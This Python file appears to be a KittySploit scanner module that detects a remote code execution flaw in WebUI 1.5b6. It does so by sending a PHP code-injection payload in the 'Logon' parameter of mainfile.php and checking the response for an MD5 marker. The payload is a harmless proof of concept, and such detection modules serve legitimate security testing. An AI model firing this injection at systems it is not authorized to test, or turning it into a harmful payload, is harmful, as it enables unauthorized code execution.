#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WebUI 1."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WebUI 1.5b6 - Remote Code Execution Detection',
        'description': "WebUI 1.5b6 is vulnerable to remote code execution because the 'mainfile.php' endpoint allows remote attackersto execute arbitrary code via the 'Logon' parameter.",
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'vulnerability', 'webui', 'rce', 'edb', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': ['https://www.exploit-db.com/exploits/36821'],
    }

    def run(self):
        r = self.http_request(method="GET", path='/mainfile.php?username=test&password=testpoc&_login=1&Logon=%27%3Becho%20md5(TestPoc)%3B%27', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('c5b3d7397a90f42d222f7ed9408c0dc6',)
        if (any(m in body for m in body_any)):
            self.set_info(
                severity='critical',
                reason="WebUI 1.5b6 - Remote Code Execution detected",
                path='/mainfile.php?username=test&password=testpoc&_login=1&Logon=%27%3Becho%20md5(TestPoc)%3B%27',
            )
            return True
        return False

